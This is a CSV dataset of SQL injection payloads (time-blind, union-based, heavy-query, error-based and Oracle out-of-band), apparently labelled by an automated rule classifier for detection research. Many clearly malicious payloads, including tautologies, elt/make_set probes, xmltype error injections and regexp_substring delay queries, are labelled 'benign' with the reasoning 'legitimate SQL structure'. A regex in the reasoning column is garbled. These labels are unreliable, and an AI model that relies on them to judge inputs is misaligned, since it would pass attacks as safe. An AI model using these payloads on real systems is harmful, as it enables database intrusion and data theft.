id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24285,1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 3332 = 3332,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24286,"-9361"" ) ) union all select 3112#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24287,"1"" ) ) union all select null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24288,"1' union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24289,"-8709"" or 8571 = 8571--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24290,"select count ( * ) from generate_series ( 1,5000000 ) -- gqkk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24291,"1 ) ) and elt ( 4249 = 4249,7259 ) and ( ( 5683 = 5683",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24292,"-2325' ) ) ) union all select 1442,1442,1442--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24293,"1"" ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( ""wile"" like ""wile",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24294,"1', ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24295,"-9379 ) or make_set ( 9354 = 9354,7185 ) and ( 9212 = 9212",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24296,"1%"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24297,1%' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24298,"1 ) ) as cvid where 4381 = 4381 union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24299,"1'|| ( select 'scwx' where 6591 = 6591 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) ) ||'",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24300,"1' in boolean mode ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24301,select ( case when ( 3565 = 4053 ) then 3565 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24302,1 where 4091 = 4091,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24303,"-9864"" ) or elt ( 5885 = 4936,4936 ) and ( ""bfbb"" like ""bfbb",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24304,1' ) as fkpn where 1100 = 1100,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24305,"1'+ ( select zbyt where 4575 = 4575 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ) +'",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24306,"-5817' in boolean mode ) union all select 2391,2391,2391,2391,2391--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24307,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""uidb"" like ""uidb",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24308,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'nczi' = 'nczi",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24309,"1%"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24310,"1 where 1656 = 1656 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24311,"1%' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24312,"1' ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'gmvk' like 'gmvk",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24313,"1%"" union all select null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24314,select ( case when ( 5856 = 7176 ) then 5856 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24315,"1 ) union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24316,"-9638 ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 3679 = 3679",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24317,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'vnfi' = 'vnfi,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24318,"1"" ) ) as lslk where 6729 = 6729 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24319,1 ) ) rlike sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24320,"1"" ) ) as rrms where 8185 = 8185 union all select null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24321,1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24322,"1%"" ) ) ) and 2006 = 2006",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24323,select ( case when ( 3677 = 2193 ) then 3677 else 1/ ( select 0 ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24324,"1' ) where 6328 = 6328 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24325,select ( case when ( 2501 = 4688 ) then 2501 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24326,1 ) ) as bvij where 7913 = 7913,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24327,"1%"" union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24328,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( 'cixa' like 'cixa",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24329,"1"" ) as ufai where 9673 = 9673",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24330,"1"" where 2072 = 2072 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24331,"-8203 ) ) as eqlf where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24332,1 ) ) as pxmz where 2596 = 2596,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24333,"1' ) ) or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24334,"1', ( select ( case when ( 5586 = 6403 ) then 1 else 5586* ( select 5586 from mysql.db ) end ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24335,-6039%' ) ) or 6872 = 6872 and ( ( '%' = ',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24336,"1"" ) as yzny where 4869 = 4869 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24337,1 ) where 1487 = 1487,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24338,1'|| ( select 'abjv' from dual where 4200 = 4200,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24339,"1%"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24340,"select * from generate_series ( 6730,6730,case when ( 6730 = 9431 ) then 1 else 0 end ) limit 1--",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24341,"1'+ ( select immd where 7499 = 7499 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24342,"1 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24343,1' ) where 8128 = 8128,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
